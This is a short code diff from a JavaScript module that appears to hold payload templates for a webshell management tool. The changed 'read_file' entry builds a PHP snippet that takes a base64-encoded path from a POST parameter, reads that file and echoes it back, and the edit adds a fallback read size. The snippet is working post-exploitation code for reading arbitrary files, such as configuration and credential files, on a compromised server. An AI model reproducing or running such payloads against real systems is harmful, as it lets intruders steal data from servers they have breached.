@@ -24,7 +24,7 @@ module.exports = (arg1, arg2, arg3) => ({
 
   read_file: {
     _:
-      `$F=base64_decode($_POST["${arg1}"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));@fclose($P);`,
+      `$F=base64_decode($_POST["${arg1}"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)?filesize($F):4096));@fclose($P);`,
     [arg1]: "#{base64::path}"
   },
 
